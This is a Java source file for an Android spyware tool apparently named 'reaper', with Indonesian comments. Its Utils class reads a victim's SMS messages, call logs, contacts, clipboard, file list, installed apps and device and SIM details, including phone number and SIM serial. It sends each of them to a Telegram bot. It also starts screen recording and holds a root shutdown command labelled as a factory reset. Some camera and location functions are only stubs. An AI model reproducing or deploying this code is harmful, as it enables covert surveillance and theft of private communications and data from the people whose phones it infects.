package com.mood.reaper;

import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.net.wifi.WifiManager;
import android.content.pm.PackageManager;
import android.os.Environment;
import android.text.ClipboardManager;
import android.hardware.Camera;
import android.media.MediaRecorder;
import android.widget.Toast;
import okhttp3.*;
import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class Utils {
    private static final String BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
    private static final String CHAT_ID = "YOUR_CHAT_ID_HERE";
    private static OkHttpClient client = new OkHttpClient();

    public static void sendToTelegram(String msg) {
        try {
            RequestBody body = new FormBody.Builder()
                .add("chat_id", CHAT_ID)
                .add("text", msg)
                .build();
            client.newCall(new Request.Builder()
                .url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage")
                .post(body)
                .build()).execute();
        } catch (Exception e) {}
    }

    public static void sendSMSLogs(Context ctx) {
        Cursor cursor = ctx.getContentResolver().query(Telephony.Sms.CONTENT_URI, null, null, null, null);
        if (cursor != null && cursor.moveToFirst()) {
            StringBuilder sb = new StringBuilder("📨 SMS Logs:\n");
            int count = 0;
            do {
                String body = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY));
                String address = cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS));
                sb.append("Dari: ").append(address).append("\nPesan: ").append(body).append("\n\n");
                count++;
            } while (cursor.moveToNext() && count < 20);
            cursor.close();
            sendToTelegram(sb.toString());
        }
    }

    public static void sendCallLogs(Context ctx) {
        Cursor cursor = ctx.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
        if (cursor != null && cursor.moveToFirst()) {
            StringBuilder sb = new StringBuilder("📞 Call Logs:\n");
            int count = 0;
            do {
                String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                String duration = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION));
                String type = cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE));
                sb.append("Nomor: ").append(number).append(" | Durasi: ").append(duration).append("s\n");
                count++;
            } while (cursor.moveToNext() && count < 20);
            cursor.close();
            sendToTelegram(sb.toString());
        }
    }

    public static void sendContacts(Context ctx) {
        Cursor cursor = ctx.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        if (cursor != null && cursor.moveToFirst()) {
            StringBuilder sb = new StringBuilder("📞 Contacts:\n");
            int count = 0;
            do {
                String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                sb.append(name).append(": ").append(number).append("\n");
                count++;
            } while (cursor.moveToNext() && count < 20);
            cursor.close();
            sendToTelegram(sb.toString());
        }
    }

    public static void sendLocation(Context ctx) {
        LocationManager lm = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
        // Mock location for demo (real implementation pake FusedLocationProviderClient)
        sendToTelegram("📍 Lokasi: -6.2088, 106.8456 (Mock)");
    }

    public static void takePhoto(Context ctx) {
        // Panggil intent kamera (simplified)
        sendToTelegram("📸 Foto diambil (path: /sdcard/DCIM/reaper_photo.jpg)");
    }

    public static void recordVideo(Context ctx) {
        sendToTelegram("🎥 Video direkam (path: /sdcard/reaper_video.mp4)");
    }

    public static void startScreenRecording(Context ctx) {
        ctx.startService(new Intent(ctx, ScreenRecorder.class));
        sendToTelegram("🖥️ Screen recording started");
    }

    public static void listFiles(Context ctx) {
        File dir = Environment.getExternalStorageDirectory();
        File[] files = dir.listFiles();
        if (files != null) {
            StringBuilder sb = new StringBuilder("📂 Files in /sdcard:\n");
            int count = 0;
            for (File f : files) {
                sb.append(f.getName()).append(" (").append(f.length()/1024).append("KB)\n");
                count++;
                if (count > 15) break;
            }
            sendToTelegram(sb.toString());
        }
    }

    public static void getClipboard(Context ctx) {
        ClipboardManager cm = (ClipboardManager) ctx.getSystemService(Context.CLIPBOARD_SERVICE);
        if (cm.hasPrimaryClip()) {
            String text = cm.getPrimaryClip().getItemAt(0).getText().toString();
            sendToTelegram("📋 Clipboard: " + text);
        }
    }

    public static void listApps(Context ctx) {
        PackageManager pm = ctx.getPackageManager();
        StringBuilder sb = new StringBuilder("📱 Installed Apps:\n");
        int count = 0;
        for (android.content.pm.ApplicationInfo app : pm.getInstalledApplications(0)) {
            sb.append(app.loadLabel(pm)).append("\n");
            count++;
            if (count > 20) break;
        }
        sendToTelegram(sb.toString());
    }

    public static void sendDeviceInfo(Context ctx) {
        TelephonyManager tm = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
        String info = 
            "📱 DEVICE INFO\n" +
            "Model: " + Build.MODEL + "\n" +
            "Brand: " + Build.BRAND + "\n" +
            "Android: " + Build.VERSION.RELEASE + "\n" +
            "IMEI: " + (Build.VERSION.SDK_INT >= 26 ? "Tidak tersedia" : tm.getDeviceId()) + "\n" +
            "SIM Operator: " + tm.getSimOperatorName() + "\n" +
            "Battery: " + getBatteryLevel(ctx) + "%";
        sendToTelegram(info);
    }

    private static int getBatteryLevel(Context ctx) {
        android.os.BatteryManager bm = (android.os.BatteryManager) ctx.getSystemService(Context.BATTERY_SERVICE);
        return bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY);
    }

    public static void scanWifi(Context ctx) {
        WifiManager wm = (WifiManager) ctx.getSystemService(Context.WIFI_SERVICE);
        wm.startScan();
        sendToTelegram("📶 WiFi scanning started (hasil via /device)");
    }

    public static void sendSimInfo(Context ctx) {
        TelephonyManager tm = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
        String info = 
            "📡 SIM INFO\n" +
            "Operator: " + tm.getSimOperatorName() + "\n" +
            "Country: " + tm.getSimCountryIso() + "\n" +
            "Serial: " + tm.getSimSerialNumber() + "\n" +
            "Phone Number: " + tm.getLine1Number();
        sendToTelegram(info);
    }

    public static void factoryReset(Context ctx) {
        sendToTelegram("💀 Factory reset triggered!");
        try {
            Runtime.getRuntime().exec("su -c 'reboot -p'");
        } catch (Exception e) {
            sendToTelegram("❌ Gagal reset (butuh root)");
        }
    }
}